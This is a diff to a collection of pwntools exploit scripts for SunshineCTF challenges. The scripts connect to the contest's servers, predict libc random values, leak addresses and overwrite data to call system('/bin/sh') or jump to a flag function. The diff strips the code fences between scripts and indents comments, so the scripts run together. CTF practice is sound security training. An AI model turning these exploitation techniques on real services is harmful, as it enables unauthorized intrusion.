@@ -7,7 +7,7 @@
 ```
 from pwn import *
  
-#p = process('./simulator')
+    #p = process('./simulator')
 p=remote('sunshinectf.games',22000)
 # libc=ELF('./libc.so.6')
 context.log_level = 'debug'
@@ -38,22 +38,12 @@ while i<=999999999:
     sla('What is it?\n[>] ',str(libc.rand()%i+1))
     i=i*10
 p.interactive()
-```
-
-
-
-```
 get_bytes(address,count)从address处读取count个字节的内容
-```
-
-
-
-```
 from pwn import *
 from ctypes import *
 import struct
-#context.log_level = 'debug'
-#io = process('./pwn')
+    #context.log_level = 'debug'
+    #io = process('./pwn')
 context.arch='amd64'
 io = remote('sunshinectf.games',22001)
 libc = ELF('./libc-2.27.so')
@@ -70,7 +60,7 @@ dbg = lambda text=None  : gdb.attach(io, text)
 lg = lambda s            : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
 uu32 = lambda data        : u32(data.ljust(4, b'\x00'))
 uu64 = lambda data        : u64(data.ljust(8, b'\x00'))
-#gdb.attach(io, 'b*$rebase(0x180b)')
+    #gdb.attach(io, 'b*$rebase(0x180b)')
 payload='r'+'8'*2+'r'*15+'r'*0x40+'b--'+str(0x4)+p8(0xc)+str(3000000000000)
  
  
@@ -91,23 +81,18 @@ ans-=(0x564e56401d0d-0x564e56400000)
 lg("ans")
 getflag=ans+0x1349
  
-#print("ans is ----------->",ans)
+    #print("ans is ----------->",ans)
 menu(1)
-#gdb.attach(io, 'b*$rebase(0x18b0)\nb*$rebase(0x15a9)')
+    #gdb.attach(io, 'b*$rebase(0x18b0)\nb*$rebase(0x15a9)')
 io.sendline(payload)
 menu(3)
 menu(1337)
 sla("Make like a knight and jump!\n",str(getflag))
-#gdb.attach(io)
+    #gdb.attach(io)
 irt()
-```
-
-
-
-```
 from pwn import *
  
-#p = process('./elden')
+    #p = process('./elden')
 p=remote('sunshinectf.games',22003)
 libc=ELF('./libc.so.6')
 context.log_level = 'debug'
@@ -148,11 +133,6 @@ sla('3. Cast thunderbolt against the Warden\n',str(3))
 sla('Leave a message? (y/n): ','y')
 sa('Leave your message: ','/bin/sh\x00'+p64(system))
 p.interactive()
-```
-
-
-
-```
 from pwn import *
  
 p = process('./magic')
@@ -180,7 +160,7 @@ def load(offset,cont,d1,d2,d3):
     sla('Enter cards:',payload)
     sleep(2)
     p.send('\n')
-#gdb.attach(p,'b* 0x401668\nb* 0x401A51\nb* 0x40198E')
+    #gdb.attach(p,'b* 0x401668\nb* 0x401A51\nb* 0x40198E')
  
 load(0x14,'aaa ',1,0x405F60,0)
 menu(4)
